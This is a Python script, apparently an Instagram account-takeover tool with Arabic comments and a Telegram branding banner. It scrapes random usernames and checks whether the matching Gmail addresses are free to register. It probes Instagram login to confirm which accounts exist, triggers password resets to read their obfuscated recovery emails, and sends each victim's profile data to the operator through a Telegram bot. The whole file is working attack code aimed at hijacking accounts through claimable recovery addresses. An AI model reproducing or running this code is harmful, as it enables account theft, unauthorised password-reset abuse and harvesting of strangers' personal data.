try:
	import requests
	import socket
	import webbrowser
	import random 
	from uuid import uuid4
	uid = uuid4()
	uis = str(uuid4())
	import os
	import time
	import json
	import instaloader
	from user_agent import generate_user_agent
except ModuleNotFoundError:
	os.system('pip install requests')
	os.system('pip install socket')
	os.system('pip install instaloader')
	os.system('pip install webbrowser')
	os.system('pip install os')
	os.system('pip install random')
	os.system('pip install time')
	os.system('pip install json')
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'


import requests,sys,os,time
yso = 'insta4'
pss=input("\033[1;31m [~]ENTER PASSWORD :")
if pss ==yso:
 pass
 print("\033[2;32m         SUCCESS PASSWORD ")
 time.sleep(1)
 os.system('clear')
else:
 exit('             WORNG PASSWORD ')

v=0
b=0
n=0
m=0
q=0
w=0
e=0
r=0
a=0
z=0
t=0
ci=0
A=0
f=0
def azz():
	azro = (f'''

	''')
	for azr in azro.splitlines():
		time.sleep(0.01)
		print(azr)
azz()

def mo9():
  
  azro = (f"""        {Z}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┓
---------------------------JOKER-----------------------------           {X}Telegram  :    @ X_77_O      @ mosLord777 \n        {Z}┗{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┛\n\n\n\n""")
  for azr in azro.splitlines():
    time.sleep(0.05)
    print(azr)
mo9()
uid = uuid4()


es = input(f' {F}({C}1{F}) {X} ENTER SESSION ID {F}  '+Z)
print(X+' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  ')
token = input(f' {F}({C}2{F}) {X} ENTER TOKEN {F}  '+Z)
print(X+' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  ')
ID = input(f' {F}({C}3{F}) {X} ENTER ID{F}  '+Z)
os.system('clear')
head = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
'cookie': 'mid=Y_b2FwABAAH6fQQ8MBd797tXDPbs; ig_did=12E9FEAC-81BA-4BF4-ABE6-FA481DDD10BD; ig_nrcb=1; datr=EPb2Y8HcQj90wkAKjje2wKRv; csrftoken=IF5IabRHTCc1ym0q5Gb7mC2LApRKoMGS; sessionid='+es+'"',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'IF5IabRHTCc1ym0q5Gb7mC2LApRKoMGS',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR2M8P8_d7bvLTR7zVAphA15aAoyYXFGByqPC36ugQK8Wv2m',
'x-instagram-ajax': '1006224323',
}


def ch(email,user):
 
 global v,b,n,m
 user=str(user)
 email=str(email)
 url = 'https://i.instagram.com/api/v1/accounts/login/'
 headers = {

'Content-Length': '340',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Host': 'i.instagram.com',
'Connection': 'Keep-Alive',
'User-Agent': 'Instagram 6.12.1 Android (29/10; 480dpi; 1080x2137; HUAWEI/HONOR; JSN-L22; HWJSN-H; kirin710; ar_EG)',
'Cookie': 'mid=YxfCAQABAAG82m8NRgdsiWEYbhTq; csrftoken=8Ot6Srxbp23reyVuew7mytfMEGFoVrlC',
'Cookie2': '$Version=1',
'Accept-Language': 'en-EG, en-US',
'X-IG-Connection-Type': 'WIFI',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',

}


 data = {

"username":email,"password":"paswgwgshhddv","device_id":uis,
}

 req= requests.post(url, headers=headers, data=data).text
 
 if "The username you entered doesn't appear to belong to an account. Please check your username and try again." in req:
 	
 	os.system('cls'if os.name=='net'else'clear')
 	n+=1
 	print(f'''  
 {F} [Abdo] {F}- {F}Good     » 「{v}」
 {Z} [Abdo] {Z}- {Z}BAD GM   » 「{b}」
 {X} [Abdo] {X}- {X}BAD IG   » 「{n}」
 {U} [Abdo] {U}- {U}Good GM  » 「{m}
 {X} [Abdo] [{email}] ''')
           	    	
 elif "The password you entered is incorrect. Please try again." in req:
 			os.system('cls'if os.name=='net'else'clear')
 			v+=1
 			print(f'''  
 {F} [Abdo] {F}- {F}Good     » 「{v}」
 {Z} [Abdo] {Z}- {Z}BAD GM   » 「{b}」
 {X} [Abdo] {X}- {X}BAD IG   » 「{n}」
 {U} [Abdo] {U}- {U}Good GM  » 「{m}
 {X} [Abdo] [{email}] ''')
 			user = email.split('@')[0]
 			re = requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis', headers=head).json()
 			id = re['graphql']['user']['id']
 			nam = re['graphql']['user']['full_name']
 			user = re['graphql']['user']['username']
 			Follos = re['graphql']['user']['edge_followed_by']['count']
 			Follon = re['graphql']['user']['edge_follow']['count']
		
 			date = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["date"]
 			bio = re['graphql']['user']['biography']
 			isp = re['graphql']['user']['is_private']
 			Post = re['graphql']['user']['edge_owner_to_timeline_media']['count']
 			try:
 				ur = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'

 				hs = {

'Content-Length': '304',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Host': 'i.instagram.com',
'Connection': 'Keep-Alive',
'User-Agent': 'Instagram 6.12.1 Android (29/10; 480dpi; 1080x2137; HUAWEI/HONOR; JSN-L22; HWJSN-H; kirin710; ar_EG)',
'Cookie': 'mid=YxfCAQABAAG82m8NRgdsiWEYbhTq; csrftoken=8Ot6Srxbp23reyVuew7mytfMEGFoVrlC',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',

'X-IG-Connection-Type': 'WIFI',

'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',

}

 				df = {

"user_id":id,"device_id":uis,

}

 				sr = requests.post(ur,headers=hs,data=df).json()
	
 				rest = sr["obfuscated_email"]
	
			
	
 				tlg = (f'''
تعال جبتلك متاح انستا
 ℕ𝔸𝕄𝔼 » [{nam}]    
 𝕌𝕊𝔼ℝℕ𝔸𝕄𝔼 » [{user}] 
 𝔼𝕄𝔸𝕀𝕃 » [{email}]   
 𝕀𝔻 » [{id}]   
 𝔽𝕆𝕃𝕃𝕆𝕎𝔼ℝ » [{Follos}]   
 𝔽𝕆𝕃𝕃𝕆𝕎𝕀ℕ » [{Follon}]   
 𝔻𝔸𝕋𝔼 » [{date}]   
 ℙ𝕆𝕊𝕋 » [{Post}]   
 ℝ𝔼𝕊𝕋 » [{rest}]   
 ℙℝ𝕀𝕍𝔸𝕋𝔼 » [{isp}]   
 𝔹𝕀𝕆 » [{bio}]   
 𝕃𝕀ℕ𝕂 » https://www.instagram.com/{user}   
———————×———————
𝐁𝐘 :  「 @X_77_O 」
———————×———————
	''')
 				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 				
			
 			except KeyError:
 				ch(email,user)
 			
 
 
def yahoo(email,user):
	global v,b,n,m
	
	
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
  'Content-Length':'98',
  'Content-Type':'text/plain; charset=UTF-8',
  'Host':'android.clients.google.com',
  'Connection':'Keep-Alive',
  'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
  }

	d = json.dumps({
  'username':email,
  'version':'3',
  'firstName':'AbaLahb',
  'lastName':'AbuJahl'
 })

	res = requests.post(url,data=d,headers=h)
	
	if res.json()['status'] == 'SUCCESS':
		 	os.system('cls'if os.name=='net'else'clear')
		 	m+=1
		 	print(f'''
 {F} [Abdo] {F}- {F}Good     » 「{v}」
 {Z} [Abdo] {Z}- {Z}BAD GM   » 「{b}」
 {X} [Abdo] {X}- {X}BAD IG   » 「{n}」
 {U} [Abdo] {U}- {U}Good GM  » 「{m}
 {X} [Abdo] [{email}] ''')
		 	ch(email,user)
		 	
	elif res.json()['status'] == 'USERNAME_UNAVAILABLE':
			os.system('cls'if os.name=='net'else'clear')
			b+=1
			print(f''' 
 {F} [Abdo] {F}- {F}Good     » 「{v}」
 {Z} [Abdo] {Z}- {Z}BAD GM   » 「{b}」
 {X} [Abdo] {X}- {X}BAD IG   » 「{n}」
 {U} [Abdo] {U}- {U}Good GM  » 「{m}
 {X} [Abdo] [{email}] ''')
			
	
def users():
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='6789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    if '_' in str(email):
      
      continue
    else :
      
      yahoo(email,user)
  except IndexError:
   users()
users()
